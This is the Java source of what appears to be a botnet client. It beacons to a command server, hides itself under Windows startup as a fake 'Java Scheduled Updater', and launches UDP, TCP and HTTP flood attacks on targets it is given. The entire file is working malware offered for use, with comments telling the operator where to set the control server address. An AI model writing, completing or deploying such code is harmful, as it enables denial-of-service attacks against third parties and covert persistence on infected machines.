package com.am77;

import java.io.*;
import java.math.BigInteger;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.zip.Inflater;

import com.am77.extern.HttpRequest;
import com.am77.extern.RegistryUtils;

import java.net.ConnectException;

public class Client {

    public static String filename = "jupdate.jar";  // This is the compiled jar name
    public static boolean debug = true;  // Change this to false on release
    public static int packSize = 65000;


    public static void main(String[] args) throws InterruptedException{

        String os = System.getProperty("os.name");
        String body = "";

        while (true) {

            try {
                HttpRequest request = HttpRequest.get("http://192.168.153.34:8080/" + os + "/" + getWanIp());  // Change this to the IP:port of your listen server
                body = request.body();
                debug(body);

                if (os.startsWith("Windows")) {
                    addToStartup();
                }
                body = body.replace("\n", "");

              /*
               Parse the response here
              */
                String[] splitBody = body.split(" ");
                try {
                    if (body.equals("NONE")) {
                        debug("Got a none, waiting 3 seconds.");
                        Thread.sleep(3000);  //TODO change this to a minute

                    } else if (body.startsWith("udp") && splitBody.length == 3) {
                        debug(body);
                        udpFlood(splitBody[1], Long.parseLong(splitBody[2]));

                    } else if (body.startsWith("tcp") && splitBody.length == 5) {
                        debug(body);
                        tcpFlood(splitBody[1], Integer.parseInt(splitBody[2]), Integer.parseInt(splitBody[4]), Long.parseLong(splitBody[3]));

                    } else if (body.startsWith("http") && splitBody.length == 3) {
                        debug(body);
                        httpFlood(splitBody[1], Long.parseLong(splitBody[2]));

                    } else if (body.startsWith("visit")) {
                        debug(body);
                        visit(new URL(splitBody[1]));

                    } else {
                        debug("Got an unknown command: " + body);
                    }
                } catch (Exception ioe){
                    debug("Couldn't perform action :(");
                    ioe.printStackTrace();
                }

            } catch (HttpRequest.HttpRequestException hre){
                debug("Server not responding, waiting 10");
                Thread.sleep(10000);  // TODO change to a few minutes
            }
        }
    }


/*
 ______ _                 _
|  ____| |               | |
| |__  | | ___   ___   __| |___
|  __| | |/ _ \ / _ \ / _` / __|
| |    | | (_) | (_) | (_| \__ \
|_|    |_|\___/ \___/ \__,_|___/

*/
    public static void udpFlood(String host, final long duration) throws Exception{
      final String target = resolve(host);
       new Thread(new Runnable() {

           public void run() {
               try {
                   long endTime = System.currentTimeMillis() + duration;
                   DatagramSocket udpSocket = new DatagramSocket();
                   while (System.currentTimeMillis() < endTime) {
                       byte[] data = new byte[65000];
                       data = fillPack().getBytes();
                       try {
                           udpSocket.send(new DatagramPacket(data, data.length, InetAddress.getByName(target), (int) (Math.random() * 65534) + 1));
                       } catch (IOException ioe) {
                       }
                   }
                   udpSocket.close();
               } catch (SocketException se) {
               }
           }
       }).start();
    }

    public static void tcpFlood(String host, final int port, int thread, final long duration) throws Exception {
        final String target = resolve(host);
        for (int i = 0; i < thread; i++) {
            new Thread(new Runnable() {

                public void run() {
                    try {
                        long endTime = System.currentTimeMillis() + duration;
                        while (System.currentTimeMillis() < endTime) {
                            new Socket(target, port);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }
    }

    public static void httpFlood(String host, final long duration) throws Exception {
        final String target = resolve(host);
        new Thread(new Runnable() {
            public void run() {
                long endTime = System.currentTimeMillis() + duration;
                while (System.currentTimeMillis() < endTime) {
                    try {
                        HttpURLConnection conn = (HttpURLConnection) new URL(target).openConnection();
                        conn.setRequestMethod("GET");
                    } catch (IOException ex) {
                        ex.printStackTrace();
                    }
                }
            }
        }).start();
    }

    // TODO DONT FORGET TO IMPLEMENT THIS
    public static void pingOD(final String host, final long duration, int thread) throws Exception {
        final String target = resolve(host);
        for (int i = 0; i < thread; i++) {
            new Thread(new Runnable() {

                public void run() {
                    try {
                        long endTime = System.currentTimeMillis() + duration;
                        InetAddress addr = InetAddress.getByName(host);
                        while (System.currentTimeMillis() < endTime) {
                            addr.isReachable(5);  // Sends a ping to the target (5 sec timeout)
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }
    }

/*
    ____  __  __
   / __ \/ /_/ /_  ___  _____
  / / / / __/ __ \/ _ \/ ___/
 / /_/ / /_/ / / /  __/ /
 \____/\__/_/ /_/\___/_/

*/
    private static void visit(final URL url) throws Exception {
        new Thread(new Runnable() {
            public void run() {
                try {
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setDoOutput(true);
                    conn.setReadTimeout(500);
                    conn.connect();
                    conn.getInputStream();
                    conn = null;
                } catch (MalformedURLException murle) {
                    murle.printStackTrace();
                } catch (IOException ioe) {
                    ioe.printStackTrace();
                }
            }
        }).start();
    }

    private static void addToStartup(){
        try {
            RegistryUtils.writeStringValue(RegistryUtils.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Java Scheduled Updater", "\"" + System.getProperty("user.home") + "\\"  + filename + "\"");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void debug(String msg){
        if (debug)
            System.out.println(msg);

    }

    private static String resolve(String host) throws Exception {
        URL url = null;
        if (host.contains("http://")) {
            url = new URL(host);
        } else {
            url = new URL("http://" + host);
        }
        return InetAddress.getByName(url.getHost()).getHostAddress();
    }

    public static String getWanIp(){
        String ip = "";
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));

            ip = in.readLine(); //you get the IP as a String
        } catch(Exception e){
            e.printStackTrace();
        }
        return ip;
    }


  public static String fillPack(){
    String result = "";
    for (int i=0; i < packSize; i++){
      result += "A";
    }
    return result;
  }

}
